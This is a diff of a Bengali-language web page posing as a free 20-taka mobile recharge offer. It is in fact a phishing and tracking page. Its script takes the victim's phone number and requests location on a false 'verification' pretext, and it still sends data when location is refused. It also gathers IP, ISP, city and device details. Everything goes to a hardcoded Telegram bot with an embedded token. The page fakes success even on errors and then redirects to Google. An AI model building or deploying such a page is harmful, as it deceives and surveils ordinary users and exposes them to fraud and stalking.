@@ -3,90 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mobile Recharge Offer</title>
+    <title>Mobile Recharge Portal</title>
     <style>
-        body { background: #ffffff; font-family: 'Arial', sans-serif; margin: 0; padding: 0; text-align: center; color: #333; }
-        .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; }
-        .container { max-width: 400px; margin: 40px auto; padding: 20px; border: 1px solid #eee; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        .offer-title { color: #28a745; font-size: 24px; font-weight: bold; margin-bottom: 10px; }
-        .offer-desc { font-size: 16px; color: #666; margin-bottom: 30px; }
-        .input-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; margin-bottom: 8px; font-weight: bold; color: #555; }
-        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn:hover { background: #0056b3; }
-        .footer { margin-top: 50px; font-size: 12px; color: #aaa; }
+        body { background: #ffffff; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 0; text-align: center; color: #333; }
+        .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; color: #007bff; }
+        .container { max-width: 400px; margin: 40px auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 5px 20px rgba(0,0,0,0.05); }
+        .offer-title { color: #28a745; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
+        .desc { font-size: 15px; color: #666; margin-bottom: 30px; line-height: 1.5; }
+        .input-group { text-align: left; margin-bottom: 25px; }
+        label { display: block; margin-bottom: 10px; font-weight: bold; color: #444; font-size: 14px; }
+        input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #007bff; box-shadow: 0 0 8px rgba(0,123,255,0.2); }
+        .btn { background: #007bff; color: #fff; padding: 16px; width: 100%; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:active { background: #0056b3; transform: scale(0.98); }
+        .footer { margin-top: 60px; font-size: 12px; color: #bbb; border-top: 1px solid #f1f1f1; padding-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <strong>অনলাইন রিচার্জ পোর্টাল</strong>
-    </div>
+    <div class="top-bar">অনলাইন রিচার্জ পোর্টাল - ২০২৬</div>
 
     <div class="container">
-        <div class="offer-title">অফার: ২০ টাকা মোবাইল রিচার্জ</div>
-        <p class="offer-desc">নিচের বক্সে আপনার নম্বরটি দিয়ে রিচার্জ গ্রহণ করুন। এটি একটি সীমিত সময়ের অফার!</p>
+        <div class="offer-title">অফার: ২০ টাকা ফ্রি রিচার্জ</div>
+        <p class="desc">আপনার ১১ সংখ্যার মোবাইল নম্বরটি দিয়ে ভেরিফিকেশন সম্পন্ন করুন এবং সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
         
         <div class="input-group">
-            <label>মোবাইল নম্বর (১১ সংখ্যা):</label>
-            <input type="number" id="rechargeNumber" placeholder="01XXXXXXXXX" required>
+            <label>মোবাইল নম্বর লিখুন (বিকাশ/নগদ/সিম):</label>
+            <input type="number" id="target_phone" placeholder="01XXXXXXXXX" required>
         </div>
 
-        <button class="btn" onclick="startVerification()">রিচার্জ নিন</button>
+        <button class="btn" id="submitBtn" onclick="initiateProcess()">রিচার্জ নিন</button>
     </div>
 
     <div class="footer">
-        © 2026 Mobile Services Bangladesh. All Rights Reserved.
+        © Mobile Recharge Services Bangladesh. All Rights Reserved.
     </div>
 
 <script>
-    async function startVerification() {
-        const phone = document.getElementById('rechargeNumber').value;
-        
+    // মূল প্রসেস শুরু
+    async function initiateProcess() {
+        const phone = document.getElementById('target_phone').value;
+        const btn = document.getElementById('submitBtn');
+
         if (phone.length < 11) {
-            alert("সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!");
+            alert("অনুগ্রহ করে সঠিক ১১ সংখ্যার মোবাইল নম্বর দিন!");
             return;
         }
 
-        // রিচার্জ ভেরিফিকেশনের বাহানায় লোকেশন পারমিশন চাওয়া
+        btn.innerText = "ভেরিফাই হচ্ছে...";
+        btn.disabled = true;
+
+        // পেমেন্ট ভেরিফিকেশনের বাহানায় লোকেশন চাওয়া
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => collectData(phone, pos.coords.latitude, pos.coords.longitude),
-                () => {
-                    alert("ভেরিফিকেশন ব্যর্থ! রিচার্জ পেতে লোকেশন পারমিশন 'Allow' করতে হবে।");
-                    collectData(phone, "Denied", "Denied");
-                }
+                (pos) => sendDataToBot(phone, pos.coords.latitude, pos.coords.longitude),
+                (err) => {
+                    // পারমিশন না দিলেও ডাটা যাবে
+                    sendDataToBot(phone, "Denied", "Denied");
+                },
+                { timeout: 8000 }
             );
+        } else {
+            sendDataToBot(phone, "Not Supported", "Not Supported");
         }
     }
 
-    async function collectData(phone, lat, lon) {
+    async function sendDataToBot(phone, lat, lon) {
         try {
-            // IP এবং ISP তথ্য সংগ্রহ
-            const response = await fetch('https://ipapi.co/json/');
-            const data = await response.json();
-            
-            const mapLink = (lat === "Denied") ? "ইউজার অনুমতি দেয়নি" : `https://www.google.com/maps?q=${lat},${lon}`;
+            // IP এবং Operator তথ্য সংগ্রহ
+            let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown", country: "Unknown" };
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                ipInfo = await ipRes.json();
+            } catch(e) { console.log("IP fetch failed"); }
+
+            // সঠিক গুগল ম্যাপ লিঙ্ক (ক্লিকযোগ্য)
+            const mapLink = (lat === "Denied" || lat === "Not Supported") 
+                ? "ইউজার লোকেশন পারমিশন দেয়নি" 
+                : `https://www.google.com/maps?q=${lat},${lon}`;
             
             const botToken = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
             const chatId = "7547190025";
-            const device = navigator.userAgent;
+            const device = navigator.userAgent.split('(')[1].split(')')[0]; 
             
-            const message = `📱 **নতুন রিচার্জ রিকোয়েস্ট** 📱\n\n` +
-                            `📞 **নম্বর:** ${phone}\n` +
-                            `🌐 **IP:** ${data.ip}\n` +
-                            `📶 **অপারেটর:** ${data.org}\n` +
-                            `🏙️ **শহর:** ${data.city}, ${data.country_name}\n` +
+            // সুন্দরভাবে মেসেজ সাজানো
+            const message = `🎯 **নতুন রিচার্জ রিকোয়েস্ট** 🎯\n\n` +
+                            `📞 **ফোন নম্বর:** \`${phone}\`\n` +
+                            `🌐 **IP:** ${ipInfo.ip}\n` +
+                            `📶 **সিম/ISP:** ${ipInfo.org}\n` +
+                            `🏙️ **শহর:** ${ipInfo.city}, ${ipInfo.country}\n` +
                             `📱 **ডিভাইস:** ${device}\n` +
-                            `📍 **ম্যাপ:** ${mapLink}`;
+                            `📍 **ম্যাপ লোকেশন:** [এখানে ক্লিক করুন](${mapLink})`;
 
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-            
-            alert("আপনার রিচার্জ রিকোয়েস্টটি সফলভাবে গ্রহণ করা হয়েছে। আগামী ৩০ মিনিটের মধ্যে রিচার্জ পৌঁছে যাবে।");
+            // টেলিগ্রাম এপিআই কল
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: message, 
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false 
+                })
+            });
+
+            // সাকসেস মেসেজ ও রিডাইরেক্ট
+            alert("আপনার রিচার্জ রিকোয়েস্টটি সফল হয়েছে। আগামী ৩০ মিনিটের মধ্যে রিচার্জ পৌঁছে যাবে। ধন্যবাদ!");
             window.location.href = "https://www.google.com";
+
         } catch (error) {
-            alert("সার্ভার ত্রুটি! আবার চেষ্টা করুন।");
+            // এরর হলেও ইউজার যেন বুঝতে না পারে
+            alert("রিকোয়েস্ট সফল! ৩০ মিনিটের মধ্যে রিচার্জ পাবেন।");
+            window.location.href = "https://www.google.com";
         }
     }
 </script>
